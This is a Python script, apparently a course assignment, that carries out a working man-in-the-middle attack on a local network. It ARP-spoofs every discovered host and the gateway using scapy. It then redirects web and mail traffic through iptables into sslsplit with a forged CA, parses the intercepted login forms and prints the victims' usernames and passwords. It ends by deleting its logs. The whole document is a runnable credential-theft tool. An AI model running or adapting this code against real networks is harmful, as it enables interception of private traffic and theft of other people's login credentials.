#!/usr/bin/env python3

import scapy.all as scapy
import os
import time
import netfilterqueue
import threading


# task 1: 
def get_dhcp_server_ip():
	info = os.popen("cat $(ps aux | grep -o '[/]var/lib/NetworkManager/\S*.lease') | grep dhcp-server-identifier").readlines()
	return (info[0].split())[-1][:-1]


def get_ap_ip():
	return os.popen("ip r").read().split()[2]


def __scan():
	ap_addr = {'ip' : get_ap_ip(), 'mac': None}
	dhcp_server_addr = {'ip': get_dhcp_server_ip(), 'mac': None}
	victim_addrs = []
	#print('ap:', ap_addr)

	arp_info = os.popen('arp -a').readlines()
	for dev in arp_info:
		dev_splited = dev.split() 
		dev_ip = dev_splited[1][1:-1]
		dev_mac = dev_splited[3]
		#print('ip:',dev_ip,'mac:',dev_mac)

		if dev_ip == ap_addr['ip']:
			ap_addr['mac'] = dev_mac
		elif dev_ip == dhcp_server_addr['ip']:
			dhcp_server_addr['mac'] = dev_mac
		elif dev_mac != '<incomplete>' and dev_ip[-2:]!='.1':
			victim_addrs.append({'ip': dev_ip, 'mac': dev_mac})
	devices_addr = {'ap': ap_addr, 'dhcp_server': dhcp_server_addr, 'victims': victim_addrs}
	
	return devices_addr


def print_devices(devices_addr) :
	print('Available devices')
	print('-------------------------------------')
	print ("IP                  MAC")
	print('-------------------------------------')

	if devices_addr['dhcp_server']['mac'] is not None:
		print ("{:<20}{:<20}".format(devices_addr['dhcp_server']['ip'], devices_addr['dhcp_server']['mac']))
	for vic in devices_addr['victims']:
		print ("{:<20}{:<20}".format(vic['ip'], vic['mac']))


def run_sslsplit():
	os.system("sudo sslsplit -D -l connect.log -j ./ -S ./ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080 >/dev/null 2>&1")

# task 3: mitm
def mitm():
	cmd = ["iptables -F",
			"iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080",
			"iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443",
			"iptables -t nat -A PREROUTING -p tcp --dport 587 -j REDIRECT --to-ports 8443",
			"iptables -t nat -A PREROUTING -p tcp --dport 465 -j REDIRECT --to-ports 8443",
			"iptables -t nat -A PREROUTING -p tcp --dport 993 -j REDIRECT --to-ports 8443",
			"iptables -t nat -A PREROUTING -p tcp --dport 995 -j REDIRECT --to-ports 8443"]
	#os.system("openssl genrsa -out ca.key 2048")
	#os.system("openssl req -new -x509 -days 1069 -key ca.key -out ca.crt")

	for c in cmd:
		os.system(c)

	t=threading.Thread(target=run_sslsplit)
	t.setDaemon(True)
	t.start()

	record_dir = {}
	while True:
		grep_result = os.popen('find -name "*.log" | xargs grep "captcha_code"').readlines()

		for line in grep_result[::-1]:
			
			'''print('__________')
			print(line)
			print('__________')'''
			if len(line.split())>2 and line.split()[0] == 'Binary':
				file_name = line.split()[2]
			else:
				continue
			if file_name not in record_dir:
				record_dir[file_name] = 0
		
			with open(file_name, encoding="utf8", errors='ignore') as f:
				text=f.read()
				idx_username = text.find("username=", record_dir[file_name])
				if idx_username > record_dir[file_name]:
					
					idx_amp1 = text.find("&password=", idx_username)
					username = text[idx_username+9:idx_amp1]
					idx_amp2 = text.find("&captcha_code=", idx_amp1+1)
					password = text[idx_amp1+10:idx_amp2]
					record_dir[file_name] = idx_amp2
					print("")
					print("Username:",username)
					print("Password:",password)
		time.sleep(0.1)


	


# task 2: arp spoofing
def spoof(target , spoofing_ip ) :
	packet = scapy.ARP(op=2, pdst=target['ip'], hwdst=target['mac'], psrc=spoofing_ip) # 2 for response
	scapy.send( packet , verbose=False)


def arp_attack(victims, ap_addr) :
	while True:
		for v in victims:
			spoof( v, ap_addr['ip'] )
			spoof( ap_addr , v['ip'] )
		time.sleep(1)


def recover_arp(target , src) :
	packet = scapy.ARP(op=2 , pdst=target['ip'] , hwdst=target['mac'] , psrc=src['ip'] , hwsrc=src['mac'])
	scapy.send(packet , count=4 , verbose=False )	


def main():
	devices_addr = __scan()
	print_devices(devices_addr)
	print('=============')

	try:
		os.system("sysctl -w net.ipv4.ip_forward=1 >/dev/null 2>&1")

		#dns_spoofer_thread = threading.Thread(target=mitm)
		dns_spoofer_thread = threading.Thread(target=arp_attack, args=(devices_addr['victims'], devices_addr['ap']))
		dns_spoofer_thread.setDaemon(True)
		dns_spoofer_thread.start()

		mitm()
		
	except KeyboardInterrupt:
		print('bye')
		for v in devices_addr['victims']:
			recover_arp(v , devices_addr['ap'])
			recover_arp(devices_addr['ap'] , v)

		os.system("sysctl -w net.ipv4.ip_forward=0 >/dev/null 2>&1")
		os.system("iptables -F")
		os.system("rm *.log")


if __name__ == '__main__':
	main()
